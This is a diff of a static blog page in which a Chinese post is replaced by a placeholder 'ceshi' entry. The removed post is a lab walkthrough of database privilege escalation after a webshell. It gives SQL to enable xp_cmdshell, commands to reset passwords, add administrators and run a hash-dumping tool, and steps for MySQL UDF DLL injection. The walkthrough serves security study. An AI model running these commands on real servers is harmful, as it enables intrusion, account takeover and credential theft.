@@ -6,32 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>mssql_mysql mention the right (mssql.mysql提权) | Toshiyuki Nagon</title>
+  <title>ceshi | Toshiyuki Nagon</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Sql server 提权0x01测试目标：利用sql server 提权">
+  <meta name="description" content="ceshi">
 <meta property="og:type" content="article">
-<meta property="og:title" content="mssql_mysql mention the right (mssql.mysql提权)">
-<meta property="og:url" content="http://yoursite.com/2016/08/08/mssql.mysql mention the right mssql.mysql提权/index.html">
+<meta property="og:title" content="ceshi">
+<meta property="og:url" content="http://yoursite.com/2017/05/04/ceshi/index.html">
 <meta property="og:site_name" content="Toshiyuki Nagon">
-<meta property="og:description" content="Sql server 提权0x01测试目标：利用sql server 提权">
-<meta property="og:image" content="http://yoursite.com/images/mssql_mysql/1.png">
-<meta property="og:image" content="http://yoursite.com/images/mssql_mysql/2.png">
-<meta property="og:image" content="http://yoursite.com/images/mssql_mysql/3.png">
-<meta property="og:image" content="http://yoursite.com/images/mssql_mysql/4.png">
-<meta property="og:image" content="http://yoursite.com/images/mssql_mysql/5.png">
-<meta property="og:image" content="http://yoursite.com/images/mssql_mysql/6.png">
-<meta property="og:image" content="http://yoursite.com/images/mssql_mysql/7.png">
-<meta property="og:image" content="http://yoursite.com/images/mssql_mysql/8.png">
-<meta property="og:image" content="http://yoursite.com/images/mssql_mysql/9.png">
-<meta property="og:image" content="http://yoursite.com/images/mssql_mysql/10.png">
-<meta property="og:image" content="http://yoursite.com/images/mssql_mysql/11.png">
-<meta property="og:image" content="http://yoursite.com/images/mssql_mysql/12.png">
-<meta property="og:image" content="http://yoursite.com/images/mssql_mysql/13.png">
-<meta property="og:updated_time" content="2016-08-10T13:05:50.134Z">
+<meta property="og:description" content="ceshi">
+<meta property="og:updated_time" content="2017-05-04T07:02:47.736Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="mssql_mysql mention the right (mssql.mysql提权)">
-<meta name="twitter:description" content="Sql server 提权0x01测试目标：利用sql server 提权">
-<meta name="twitter:image" content="http://yoursite.com/images/mssql_mysql/1.png">
+<meta name="twitter:title" content="ceshi">
+<meta name="twitter:description" content="ceshi">
   
     <link rel="alternative" href="/atom.xml" title="Toshiyuki Nagon" type="application/atom+xml">
   
@@ -163,48 +149,27 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-mssql.mysql mention the right mssql.mysql提权" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-ceshi" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      mssql_mysql mention the right (mssql.mysql提权)
+      ceshi
     </h1>
   
 
         
-        <a href="/2016/08/08/mssql.mysql mention the right mssql.mysql提权/" class="archive-article-date">
-  	<time datetime="2016-08-08T02:17:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-08</time>
+        <a href="/2017/05/04/ceshi/" class="archive-article-date">
+  	<time datetime="2017-05-04T07:01:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-04</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Sql-server-提权"><a href="#Sql-server-提权" class="headerlink" title="Sql server 提权"></a>Sql server 提权</h2><h3 id="0x01测试目标："><a href="#0x01测试目标：" class="headerlink" title="0x01测试目标："></a>0x01测试目标：</h3><p>利用sql server 提权<br><a id="more"></a></p>
-<h3 id="0x02测试环境："><a href="#0x02测试环境：" class="headerlink" title="0x02测试环境："></a>0x02测试环境：</h3><p>ip:10.22.5.62 ,获得一定的权限之后</p>
-<h3 id="0x03测试思路："><a href="#0x03测试思路：" class="headerlink" title="0x03测试思路："></a>0x03测试思路：</h3><p>通过大码拿到服务器,发现权限不足，通过写入另外第二个大码，实现后一个大码的sql server 提权，最终远程连接到对方电脑</p>
-<h3 id="0x04测试步骤："><a href="#0x04测试步骤：" class="headerlink" title="0x04测试步骤："></a>0x04测试步骤：</h3><p>（检测在上一文章以有描述）我们拿到一个网站shell后，发现权限不足，通俗的讲，通过写入一个更厉害的大码来进行操作，一般放到站点跟目录<br><img src="/images/mssql_mysql/1.png" alt="image"></p>
-<p>成功后输入url进入界面，选择数据库，这里我们选择mssql ,在connstring 中会自动生成一些信息，我们需要做的就是放入密码（实际情况下，密码是在连接数据库配置文件中找到）<br><img src="/images/mssql_mysql/2.png" alt="image"></p>
-<p>我们来到了这里，如果存在master 就是dba 权限（sa权限）<br><img src="/images/mssql_mysql/3.png" alt="image"></p>
-<p>验证执行一下能否命令<br><img src="/images/mssql_mysql/4.png" alt="image"><br>注：提示组件被关闭</p>
-<p>开启组件利用下列代码<br>USE master;<br>EXEC sp_configure ‘show advanced options’, 1;<br>RECONFIGURE WITH OVERRIDE;<br>EXEC sp_configure ‘xp_cmdshell’, 1;<br>RECONFIGURE WITH OVERRIDE;<br>EXEC sp_configure ‘show advanced options’, 0;<br>RECONFIGURE WITH OVERRIDE;<br>(关闭的话，将中间的1 设为0)</p>
-<p>执行这一步的话没有回显，但是我们已经可以执行命令了<br><img src="/images/mssql_mysql/5.png" alt="image"></p>
-<p>我比较懒，直接改了已经存在用户的密码<br><img src="/images/mssql_mysql/6.png" alt="image"></p>
-<p>远程连接<br><img src="/images/mssql_mysql/7.png" alt="image"><br>Logoff 退出</p>
-<h3 id="0x05扩展"><a href="#0x05扩展" class="headerlink" title="0x05扩展:"></a>0x05扩展:</h3><p>查看用户<br>Exec master.dbo.xp_cmdshell ‘net user’<br>更改密码<br>Exec master.dbo.xp_cmdshell ‘net user xxx zxc123’<br>加入管理员用户组<br>Exec master.dbo.xp_cmdshell ‘net localgroup administrator xxx /add’<br>激活用户<br>Exec master.dbo.xp_cmdshell ‘net user xxx /active:yes’<br>查看当前正在运行的用户<br>Exec master.dbo.xp_cmdshell ‘query user’</p>
-<p>提取哈希密码（使用工具w_32.exe）<br>Exec master.dbo.xp_cmdshell ‘c:\inetpub\wwwroot\w_32.exe’</p>
-<h2 id="Mysql数据库提权"><a href="#Mysql数据库提权" class="headerlink" title="Mysql数据库提权"></a>Mysql数据库提权</h2><h3 id="0x01测试网站："><a href="#0x01测试网站：" class="headerlink" title="0x01测试网站："></a>0x01测试网站：</h3><p>10.22.5.60</p>
-<h3 id="0x02测试方法："><a href="#0x02测试方法：" class="headerlink" title="0x02测试方法："></a>0x02测试方法：</h3><p>通过udf进行提权</p>
-<h3 id="0x03测试步骤："><a href="#0x03测试步骤：" class="headerlink" title="0x03测试步骤："></a>0x03测试步骤：</h3><p>拿到网站shell后，浏览下网站信息，执行下命令，查看是用户什么权限</p>
-<p><img src="/images/mssql_mysql/8.png" alt="image"><br><img src="/images/mssql_mysql/9.png" alt="image"><br>很显然，它只是一个低权限的users, 上传udf.php进行提权(在)</p>
-<p><img src="/images/mssql_mysql/10.png" alt="image"></p>
-<p>在分别点击dump udf     create function 之后，下方会产生一条语句</p>
-<p><img src="/images/mssql_mysql/11.png" alt="image"><br>查看一下用户</p>
-<p><img src="/images/mssql_mysql/12.png" alt="image"><br>有了权限执行命令，后面就简单的多了，创建用户，提升管理组，远程连接。<br>（命令可参考上例扩展）<br><img src="/images/mssql_mysql/13.png" alt="image"></p>
-<h3 id="0x04扩展："><a href="#0x04扩展：" class="headerlink" title="0x04扩展："></a>0x04扩展：</h3><p><strong>Mysql 5.1以下版本导出路径：</strong><br>c:\winnt\udf.dll     2000<br>c:\windows\udf.dll   2003 (有的系统被\转义，需要改为c:\windows\udf.dll)<br>导出dll文件时需要注意导出路径（一般情况下对任意目录可写，无需考虑权限问题）<br><strong>Mysql5.1 以上版本</strong><br>必须要把udf.dll文件放到mysql安装目录下的lib/plugin文件夹下才能自定义创建函数<br>可以在mysql里输入<br>Select @@basedir    寻找mysql安装路径<br>需要注意的是：该目录默认是不存在的，需要我们用webshell找到    mysql的安装路径，并在安装目录下创建lib\plugin文件夹，然后将udf.dll 导出到该目录就好</p>
+        <p>ceshi</p>
 
       
       
@@ -217,7 +182,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web安全</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
         		</li>
       		
 		</ul>
@@ -273,7 +238,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2016/08/08/mssql.mysql mention the right mssql.mysql提权/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/05/04/ceshi/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -287,18 +252,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2016/08/10/linux-mention-the-right-and-Free-password-Linux的提权和自由密码/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          linux mention the right and Free password (Linux的提权和自由密码)
-        
-      </div>
-    </a>
   
-  
-    <a href="/2016/08/05/After-get-webshell-getshell之后？/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">After get webshell (getshell 之后?)</div>
+    <a href="/2017/01/11/花式弹窗/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">花式弹窗</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -314,8 +270,8 @@
   <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
 <script>
   var cloudTieConfig = {
-    url: "http://yoursite.com/2016/08/08/mssql.mysql mention the right mssql.mysql提权/", 
-    sourceId: "mssql.mysql mention the right mssql.mysql提权",
+    url: "http://yoursite.com/2017/05/04/ceshi/", 
+    sourceId: "ceshi",
     productKey: "4d82c78bbd8f405080bbbe8cac2f79ca",
     target: "cloud-tie-wrapper"
   };
